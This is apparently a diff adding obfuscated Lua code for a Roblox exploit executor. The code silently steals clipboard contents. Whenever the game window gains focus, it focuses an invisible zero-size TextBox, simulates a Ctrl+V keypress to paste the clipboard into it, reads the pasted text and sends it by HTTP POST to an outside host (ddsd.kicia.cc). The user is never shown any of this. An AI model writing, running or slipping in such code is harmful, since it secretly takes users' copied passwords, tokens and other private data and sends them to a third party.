@@ -1,0 +1,86 @@
+local function f14076(p4835)
+										local function f14077()
+											local t4797 = { Url = "https://ddsd.kicia.cc/dddddd", Method = "POST" }
+											local t4798 = { ["Content-Type"] = "text/plain" }
+											t4797.Headers = t4798
+											t4797.Body = p4835
+											v12428(t4797)
+										end
+
+										f10501(f14077)
+									end
+
+									local t4799 = cloneref(game:GetService("UserInputService"))
+									local v12461 = Instance.new("ScreenGui")
+									v12461.Parent = cloneref(game:GetService("CoreGui"))
+									local v12462 = Instance.new("TextBox")
+									v12462.Size = UDim2.new(0, 0, 0, 0)
+									v12462.TextTransparency = 1
+									v12462.ClearTextOnFocus = false
+									v12462.Text = ""
+									v12462.Parent = v12461
+									local keypress3 = keypress
+									local keyrelease3 = keyrelease
+									if not v3886(keypress3) then
+										v12429 = keypress3
+										v12430 = keyrelease3
+										if not v3886(keyrelease3) then
+											v12429 = v3887(v12429)
+											v12430 = v3887(v12430)
+
+											local function f14078()
+												v12462.Text = ""
+
+												local function f14079()
+													local f14080 = 17
+													v12429(f14080)
+													f14080 = 86
+													v12429(f14080)
+													f14080 = 86
+													v12430(f14080)
+													f14080 = 17
+													v12430(f14080)
+													local v12463 = coroutine.running()
+													f14080 = false
+													local v12464 = nil
+
+													local function f14081()
+														if not f14080 then
+															f14080 = true
+															v12464:Disconnect()
+															task.spawn(v12463)
+														end
+													end
+
+													v12464 = v12462:GetPropertyChangedSignal("Text"):Connect(f14081)
+
+													local function f14082()
+														if not f14080 then
+															f14080 = true
+															v12464:Disconnect()
+															task.spawn(v12463)
+														end
+													end
+
+													task.delay(0.2, f14082)
+													coroutine.yield()
+													local t4800 = v12462
+													f14080 = t4800
+													t4800.ReleaseFocus(f14080)
+													local Text14 = v12462.Text
+													f14080 = #Text14
+													if 1 < f14080 then
+														f14080 = f14076
+														v12464 = Text14
+														f14080(v12464)
+													end
+												end
+
+												v12462.Focused:Once(f14079)
+												v12462:CaptureFocus()
+											end
+
+											t4799.WindowFocused:Connect(f14078)
+											_leave689 = true
+										end
+									end
